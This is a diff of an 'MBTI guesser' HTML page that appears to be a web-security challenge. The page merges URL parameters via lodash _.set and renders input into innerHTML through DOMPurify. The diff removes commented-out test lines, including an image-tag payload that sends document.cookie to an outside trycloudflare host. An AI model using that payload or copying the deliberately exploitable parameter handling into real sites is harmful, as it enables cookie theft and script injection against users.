@@ -4,11 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <script src="main.js"></script>
-    <!-- load lodash library 4.17.15 -->
-    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.15/lodash.min.js"></script>
+    <script src="main.js"></script>    
     <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js"></script>
     <title>MBTI guesser</title>
     <style>
         /* Basic reset */
@@ -141,7 +138,7 @@
                 <div class="buttons">
                     <button type="submit">Submit</button>
                     <button type="button" onclick="guess();">Now Guess!</button>
-                    <button type="button" onclick="report();">Invite a Friend</button>
+                    <button type="button" onclick="report();">Share this to friend!</button>
                 </div>
                 <p id="resultMsg"></p>
             </form>
@@ -155,6 +152,7 @@
             additionalInfo = {};
 
             function report(userDefinedUrl) {
+                console.log("Sharing the result to your friend now, he's taking a look at your MBTI...");
                 fetch('/report', {
                     method: 'POST',
                     headers: {
@@ -219,7 +217,6 @@
                 // get all the other param from url
                 for (const [key, value] of urlParams) {
                     lower_key = key.toLowerCase();
-                    console.log('key: ', key, 'value: ', value);
                     additionalInfo = {..._.set({}, key, value), ...additionalInfo};
                     if(lower_key != 'name' && lower_key != 'age'){
                         document.getElementById("content").innerHTML += ('<p>Cool, additional infomation about you, got that too.</p>');
@@ -229,18 +226,8 @@
                 
                 if(urlParams.has('name')){
                     name = ('<p>' + 'name: ' + urlParams.get('name') + '</p>');
-                    console.log('name purified: ', name);
-                    // document.getElementById("content").innerHTML += DOMPurify.sanitize(`<img src=https://home-cornwall-zum-folks.trycloudflare.com?${encodeURIComponent(document.cookie)}>`);
-                    // document.getElementById("content").innerHTML += DOMPurify.sanitize(urlParams.get('name'));
-                    // document.getElementById("content").innerHTML += `<img src=https://home-cornwall-zum-folks.trycloudflare.com?${encodeURIComponent(document.cookie)}>`;
-                    // const content = document.getElementById("content");
-                    // const rawHTML = urlParams.get('name');
-                    // const tempDiv = document.createElement('div');
-                    // tempDiv.innerHTML = rawHTML;
-                    // content.appendChild(tempDiv.firstChild); // Append the parsed HTML element
                     console.log('DOMPurified element: ', DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>'));
                     document.getElementById("content").innerHTML += DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>');
-                    // document.getElementById("content").innerHTML += rawHtml;
                 }
                 if(urlParams.has('age')){
                     age = DOMPurify.sanitize('<p>' + 'age: ' + urlParams.get('age') + '</p>')
@@ -266,7 +253,6 @@
                     // Construct URL based on user input
                     searchParams.set(userInputTagValue, userInputValue);
 
-                    // window.history.replaceState({}, '', `${window.location.pathname}?${searchParams}`);
                     document.location.href = `${window.location.pathname}?${searchParams}`;
                     
             });
